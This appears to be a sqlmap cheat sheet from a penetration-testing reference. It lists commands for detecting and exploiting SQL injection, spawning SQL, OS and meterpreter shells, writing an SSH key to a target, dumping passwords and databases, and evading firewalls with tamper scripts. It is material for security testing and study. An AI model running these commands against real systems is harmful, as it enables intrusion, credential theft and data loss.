# sqlmap

> sqlmap is a powerful tool that automates the detection and exploitation of sql injection vulnerabilities, saving time and effort compared to manual testing. it supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios. 

> additionally, sqlmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.

> reinventing the wheel isn't ideal because sqlmap has been rigorously developed, tested, and improved by experts. using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.

>however you should always know how sqlmap is working, and be able to replicate it manually if necessary.


## summary

* [basic arguments for sqlmap](#basic-arguments-for-sqlmap)
* [load a request file](#load-a-request-file)
* [custom injection point](#custom-injection-point)
* [second order injection](#second-order-injection)
* [getting a shell](#getting-a-shell)
* [crawl and auto-exploit](#crawl-and-auto-exploit)
* [proxy configuration for sqlmap](#proxy-configuration-for-sqlmap)
* [injection tampering](#injection-tampering)
    * [suffix and prefix](#suffix-and-prefix)
    * [tamper scripts](#tamper-scripts)
* [reduce requests number](#reduce-requests-number)
* [sqlmap without sql injection](#sqlmap-without-sql-injection)
* [references](#references)


## basic arguments for sqlmap

```powershell
sqlmap --url="<url>" -p username --user-agent=sqlmap --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=mysql --os=linux --banner --is-dba --users --passwords --current-user --dbs
```


## load a request file

a request file in sqlmap is a saved http request that sqlmap reads and uses to perform sql injection testing. this file allows you to provide a complete and custom http request, which sqlmap can use to target more complex applications.

```powershell
sqlmap -r request.txt
```


## custom injection point

a custom injection point in sqlmap allows you to specify exactly where and how sqlmap should attempt to inject payloads into a request. this is useful when dealing with more complex or non-standard injection scenarios that sqlmap may not detect automatically.

by defining a custom injection point with the wildcard character '`*`' , you have finer control over the testing process, ensuring sqlmap targets specific parts of the request you suspect to be vulnerable.

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```


## second order injection

a second-order sql injection occurs when malicious sql code injected into an application is not executed immediately but is instead stored in the database and later used in another sql query. 

```powershell
sqlmap -r /tmp/r.txt --dbms mysql --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms mysql -second-order "http://<ip/domain>/joomla/administrator/index.php" -d "joomla" -dbs
```


## getting a shell

* sql shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
    ```

* os shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
    ```
    
* meterpreter: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
    ```

* ssh shell: 
    ```ps1
    python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
    ```


## crawl and auto-exploit

this method is not advisable for penetration testing; it should only be used in controlled environments or challenges. it will crawl the entire website and automatically submit forms, which may lead to unintended requests being sent to sensitive features like "delete" or "destroy" endpoints.

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

* `--batch` = non interactive mode, usually sqlmap will ask you questions, this accepts the default answers
* `--crawl` = how deep you want to crawl a site
* `--forms` = parse and test forms


## proxy configuration for sqlmap

to run sqlmap with a proxy, you can use the `--proxy` option followed by the proxy url. sqlmap supports various types of proxies such as http, https, socks4, and socks5.

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

* http proxy:
    ```ps1
    --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="http://user:pass@127.0.0.1:8080"
    ```
* socks proxy:
    ```ps1
    --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks4://user:pass@127.0.0.1:1080"
    ```

* socks5 proxy:
    ```ps1
    --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks5://user:pass@127.0.0.1:1080"
    ```


## injection tampering

in sqlmap, tampering can help you adjust the injection in specific ways required to bypass web application firewalls (wafs) or custom sanitization mechanisms. sqlmap provides various options and techniques to tamper with the payloads being used for sql injection.

### suffix and prefix

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

* `--suffix=suffix`: injection payload suffix string
* `--prefix=prefix`: injection payload prefix string


### tamper scripts

a tamper script  is a script that modifies the sql injection payloads to evade detection by wafs or other security mechanisms. sqlmap comes with a variety of pre-built tamper scripts that can be used to automatically adjust payloads

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comment
```

| tamper | description |
| --- | --- |
|0x2char.py | replaces each (mysql) 0x<hex> encoded string with equivalent concat(char(),…) counterpart |
|apostrophemask.py | replaces apostrophe character with its utf-8 full width counterpart |
|apostrophenullencode.py | replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | appends encoded null byte character at the end of payload |
|base64encode.py | base64 all characters in a given payload  |
|between.py | replaces greater than operator ('>') with 'not between 0 and #' |
|bluecoat.py | replaces space character after sql statement with a valid random blank character.afterwards replace character = with like operator  |
|chardoubleencode.py | double url-encodes all characters in a given payload (not processing already encoded) |
|charencode.py | url-encodes all characters in a given payload (not processing already encoded) (e.g. select -> %53%45%4c%45%43%54) |
|charunicodeencode.py | unicode-url-encodes all characters in a given payload (not processing already encoded) (e.g. select -> %u0053%u0045%u004c%u0045%u0043%u0054) |
|charunicodeescape.py | unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. select -> \u0053\u0045\u004c\u0045\u0043\u0054) |
|commalesslimit.py | replaces instances like 'limit m, n' with 'limit n offset m'|
|commalessmid.py | replaces instances like 'mid(a, b, c)' with 'mid(a from b for c)'|
|commentbeforeparentheses.py | prepends (inline) comment before parentheses (e.g. ( -> /**/() |
|concat2concatws.py | replaces instances like 'concat(a, b)' with 'concat_ws(mid(char(0), 0, 0), a, b)'|
|charencode.py | url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | replaces all occurrences of operator equal ('=') with operator 'like'  |
|escapequotes.py | slash escape quotes (' and ") |
|greatest.py | replaces greater than operator ('>') with 'greatest' counterpart |
|halfversionedmorekeywords.py | adds versioned mysql comment before each keyword  |
|htmlencode.py | html encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
|ifnull2casewhenisnull.py | replaces instances like ‘ifnull(a, b)’ with ‘case when isnull(a) then (b) else (a) end’ counterpart| 
|ifnull2ifisnull.py | replaces instances like 'ifnull(a, b)' with 'if(isnull(a), b, a)'|
|informationschemacomment.py | add an inline comment (/**/) to the end of all occurrences of (mysql) “information_schema” identifier |
|least.py | replaces greater than operator (‘>’) with ‘least’ counterpart |
|lowercase.py | replaces each keyword character with lower case value (e.g. select -> select) |
|modsecurityversioned.py | embraces complete query with versioned comment |
|modsecurityzeroversioned.py | embraces complete query with zero-versioned comment |
|multiplespaces.py | adds multiple spaces around sql keywords |
|nonrecursivereplacement.py | replaces predefined sql keywords with representations suitable for replacement (e.g. .replace("select", "")) filters|
|overlongutf8.py | converts all characters in a given payload (not processing already encoded) |
|overlongutf8more.py | converts all characters in a given payload to overlong utf8 (not processing already encoded) (e.g. select -> %c1%93%c1%85%c1%8c%c1%85%c1%83%c1%94) |
|percentage.py | adds a percentage sign ('%') infront of each character  |
|plus2concat.py | replaces plus operator (‘+’) with (mssql) function concat() counterpart |
|plus2fnconcat.py | replaces plus operator (‘+’) with (mssql) odbc function {fn concat()} counterpart |
|randomcase.py | replaces each keyword character with random case value |
|randomcomments.py | add random comments to sql keywords|
|securesphere.py | appends special crafted string |
|sp_password.py |  appends 'sp_password' to the end of the payload for automatic obfuscation from dbms logs |
|space2comment.py | replaces space character (' ') with comments |
|space2dash.py | replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  replaces space character (' ') with plus ('+')  |
|space2randomblank.py | replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | replaces and and or logical operators with their symbolic counterparts (&& and ||) |
|unionalltounion.py | replaces union all select with union select |
|unmagicquotes.py | replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | replaces each keyword character with upper case value 'insert'|
|varnish.py | append a http header 'x-originating-ip' |
|versionedkeywords.py | encloses each non-function keyword with versioned mysql comment |
|versionedmorekeywords.py | encloses each keyword with versioned mysql comment |
|xforwardedfor.py | append a fake http header 'x-forwarded-for' |


## reduce requests number

the parameter `--test-filter` is helpful when you want to focus on specific types of sql injection techniques or payloads. instead of testing the full range of payloads that sqlmap has, you can limit it to those that match a certain pattern, making the process more efficient, especially on large or slow web applications.

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="generic union query (null)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

by default, sqlmap runs with level 1 and risk 1, which generates fewer requests. increasing these values without a purpose may lead to a larger number of tests that are time-consuming and unnecessary. 

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

use the `--technique` option to specify the types of sql injection techniques to test for, rather than testing all possible ones.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=b
```


## sqlmap without sql injection

using sqlmap without exploiting sql injection vulnerabilities can still be useful for various legitimate purposes, particularly in security assessments, database management, and application testing. 

you can use sqlmap to access a database via its port instead of a url.

```ps1
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
```


## references

- [#sqlmap protip - @zh4ck - march 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
- [exploiting second order sqli flaws by using burp & custom sqlmap tamper - mehmet ince - august 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)